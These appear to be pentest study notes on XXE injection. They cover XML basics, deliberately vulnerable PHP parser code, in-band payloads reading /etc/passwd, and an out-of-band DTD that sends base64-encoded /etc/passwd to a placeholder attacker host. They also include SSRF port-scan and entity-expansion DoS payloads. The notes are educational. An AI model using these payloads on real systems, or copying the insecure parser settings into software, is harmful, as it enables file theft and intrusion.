XXE Injection

XML External Entity.

  • Microsoft Learn - XML Documents and Data

  • In-band: You can see the response from the server.

    • Just exfiltrate data.

  • Out-of-band: Can't see the response from the server.

    • Alternative channels exfiltration, like DNS or HTTP.

About XML​

Estensible Markup Language (XML) consist of elements, attributes, and character data. Used for data exchange, storage, and configuration. Often used by web services and APIs (SOAP an REST), to exchange data. Also used for configuration files, like web server configs and application settings.

<?xml version="1.0" encoding="UTF-8"?>
<user id="1">
	<name>elliot</name>
	<email>elliot@evil.corp</email>
</user>

  • <name>, ..., are elements.

  • id="1' is an attribute.

  • elliot is a character data.

  • XSLT: Language used to transform and format XML documents.

  • DTDs (Document Type Definitions): Define the structure and constraints of an XML document.

DTD example:

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE config [
<!ELEMENT config (database)>
<!ELEMENT database (username, password)>
<!ELEMENT username (#PCDATA)>
<!ELEMENT password (#PCDATA)>
]>
<config>
<!-- configuration data -->
</config>

This is an internal entity:

<!DOCTYPE note [
<!ENTITY inf "This is a test.">
]>
<note>
        <info>&inf;</info>
</note>

This is an external entity:

<!DOCTYPE note [
<!ENTITY ext SYSTEM "http://example.com/external.dtd">
]>
<note>
        <info>&ext;</info>
</note>

XML Parsers:

  • DOM (Document Object Model) Parser: Builds the entire XML doc into a memory-based tree structure. Allows random access to all parts of the doc. Resource-intensive, but flexible.
  • SAX (Simple API for XML) Parser: Parses sequentially without loading the whole doc into memory. Suitable for large XML files, but less flexible for accessing XML data randomly.
  • StAX (Streaming API for XML) Parser: Like SAX, but the developer have more control over the XML parsing process.
  • XPath Parser: Parses XML based on expression and is used a lot with XSLT.

In-Band XXE​

Request data:

<?xml version="1.0" encoding="UTF-8"?>
<contact>
	<name>test</name>
	<email>test@test.com</email>
	<message>test message</message>
</contact>

Piece of vulnerable code:

libxml_disable_entity_loader(false);

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $xmlData = file_get_contents('php://input');

    $doc = new DOMDocument();
    $doc->loadXML($xmlData, LIBXML_NOENT | LIBXML_DTDLOAD); 

    $expandedContent = $doc->getElementsByTagName('name')[0]->textContent;

    echo "Thank you, " .$expandedContent . "! Your message has been received.";
}

This one extract the name element from the user request xml. So we can define an internal entity call it.

Evil XML:

<!DOCTYPE evil [
<!ELEMENT evil ANY>
<!ENTITY etc SYSTEM "file:///etc/passwd" >]>
<contact>
	<name>&etc;</name>
	<email>test@test.com</email>
	<message>test message</message>
</contact>

Out-Of-Band XXE​

  • You'll need to be able to catch the request. In a local env you can use a python HTTP server, in a remote env you can use Interactsh from project discovery.

Example request:

<?xml version="1.0" encoding="UTF-8"?>
<upload>
	<file>http://example.com/uploads/filename.</file>
</upload>

Piece of vulnerable code:

libxml_disable_entity_loader(false);
$xmlData = file_get_contents('php://input'); 

$doc = new DOMDocument();
$doc->loadXML($xmlData, LIBXML_NOENT | LIBXML_DTDLOAD);

$links = $doc->getElementsByTagName('file');

foreach ($links as $link) {
    $fileLink = $link->nodeValue;
    $stmt = $conn->prepare("INSERT INTO uploads (link, uploaded_date) VALUES (?, NOW())");
    $stmt->bind_param("s", $fileLink);
    $stmt->execute();
    
    if ($stmt->affected_rows > 0) {
        echo "Link saved successfully.";
    } else {
        echo "Error saving link.";
    }
    
    $stmt->close();
}

Evil XML:

<!DOCTYPE evil [
<!ELEMENT evil ANY>
<!ENTITY xxe SYSTEM "http://LOCAL_IP:80/" >]>
<upload>
	<file>&xxe;</file>
</upload>

If it works, you can create an evil DTD to exfiltrate data.

<!ENTITY % cmd SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oobxxe "<!ENTITY exfil SYSTEM 'http://LOCAL_IP:1337/?data=%cmd;'>">
%oobxxe;
  • Declares an entity %cmd that points to a system resource. the PHP filter protocol then retrieves the content of /etc/passwd and encodes it to base64 to avoid formatting problems. The %oobxxe contains another XML entity declaration (exfil) that has a system identifier pointing to your local attack machine with a parameter data with %cmd, representing the encoded content of /etc/passwd.

And then, call it.

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE upload SYSTEM "http://LOCAL_IP:1337/evil.dtd">
<upload>
    <file>&exfil;</file>
</upload>

XXE Internal Network Scan​

  • SSRF + XXE
<!DOCTYPE evil [
<!ELEMENT evil ANY>
<!ENTITY xxe SYSTEM "http://localhost:PORT" >]>
<contact>
	<name>&xxe;</name>
	<email>test@test.com</email>
	<message>test message</message>
</contact>

Billion Laughs Attack (DoS)​

  • XML Entity Expansion involves defining entities withing an XML document, which the XML parser then expands.
<!DOCTYPE evil [
<!ELEMENT evil ANY>
<!ENTITY msg "This is a test message" >]>
<contact>
	<name>&msg; &msg;</name>
	<email>test@test.com</email>
	<message>test message</message>
</contact>

If this works, you can expand it to make a DoS. This is enough evidence in a Pentest and I'll not go any further with it.
